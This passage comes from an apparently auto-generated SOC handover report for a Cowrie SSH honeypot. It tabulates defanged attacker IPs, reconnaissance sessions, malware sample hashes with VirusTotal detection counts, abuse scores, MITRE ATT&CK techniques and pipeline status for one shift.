- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57fb02fc11c8

| Field | Detail |
|---|---|
| **Source IP** | `36.93.144[.]67` |
| **First Seen** | 2026-04-29 09:37 |
| **Last Seen** | 2026-04-29 09:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 09:37:49` | `cowrie.session.connect` |
| `2026-04-29 09:37:49` | `cowrie.client.version` |
| `2026-04-29 09:37:49` | `cowrie.client.kex` |
| `2026-04-29 09:37:49` | `cowrie.login.success` |
| `2026-04-29 09:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.144[.]67` to AbuseIPDB if not already reported
- [ ] Block `36.93.144[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.14.89[.]249` | **32** | 2026-04-29 08:09 | 2026-04-29 08:10 | 6m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.38.156[.]145` | **32** | 2026-04-29 06:30 | 2026-04-29 06:30 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.62.161[.]49` | **32** | 2026-04-29 07:15 | 2026-04-29 07:16 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `190.181.25[.]210` | **30** | 2026-04-29 07:14 | 2026-04-29 09:03 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `221.156.126[.]1` | **30** | 2026-04-29 07:23 | 2026-04-29 07:51 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.127[.]232` | **26** | 2026-04-29 07:16 | 2026-04-29 07:33 | 45m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.35[.]134` | **25** | 2026-04-29 09:25 | 2026-04-29 09:31 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `177.118.138[.]83` | **12** | 2026-04-29 08:40 | 2026-04-29 08:57 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `134.19.255[.]19` | **6** | 2026-04-29 07:46 | 2026-04-29 07:50 | 4m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `88.178.146[.]145` | **4** | 2026-04-29 08:13 | 2026-04-29 08:21 | 8m | 0 | `T1592` | 🟢 LOW |
| `180.76.226[.]129` | **2** | 2026-04-29 06:56 | 2026-04-29 06:58 | 2m | 0 | `T1592` | 🟢 LOW |
| `20.171.8[.]87` | **2** | 2026-04-29 08:48 | 2026-04-29 08:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.124.174[.]248` | **2** | 2026-04-29 07:46 | 2026-04-29 07:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | **2** | 2026-04-29 07:33 | 2026-04-29 07:35 | 2m | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]114` | 1 | 2026-04-29 07:19 | 2026-04-29 07:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `168.194.165[.]120` | 1 | 2026-04-29 09:04 | 2026-04-29 09:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `168.194.165[.]121` | 1 | 2026-04-29 08:58 | 2026-04-29 09:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `168.194.165[.]123` | 1 | 2026-04-29 09:00 | 2026-04-29 09:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.177.77[.]228` | 1 | 2026-04-29 08:51 | 2026-04-29 08:52 | 32s | 0 | `T1592` | 🟢 LOW |
| `36.93.144[.]67` | 1 | 2026-04-29 09:37 | 2026-04-29 09:37 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-29 10:07 | 2026-04-29 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | 1 | 2026-04-29 09:48 | 2026-04-29 09:50 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (24 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 34/100 | 🟢 LOW | **11/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.14.89[.]249` | BE | Google LLC | **100** ⚠️ | 0 |
| `34.38.156[.]145` | BE | Google LLC | **100** ⚠️ | 1 |
| `34.62.161[.]49` | BE | Google LLC | **100** ⚠️ | 1 |
| `14.103.127[.]232` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `223.123.35[.]134` | PK | CMPak Limited | **100** ⚠️ | 3 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `71.90.30[.]53` | US | Charter Communications LLC | **100** ⚠️ | 50 |
| `190.181.25[.]210` | BO | AXS Bolivia S. A. | **100** ⚠️ | 50 |
| `40.124.174[.]248` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `134.19.255[.]19` | GE | Magticom Ltd. | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 106 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 76 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (19 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 278 cases |
| Tool 34  | Credential Extractor        | ✅ 93 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 19 filtered (6.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 24 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 22 recon entry/entries in table (14 group(s) consolidating 237 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-29T10:10:10Z_
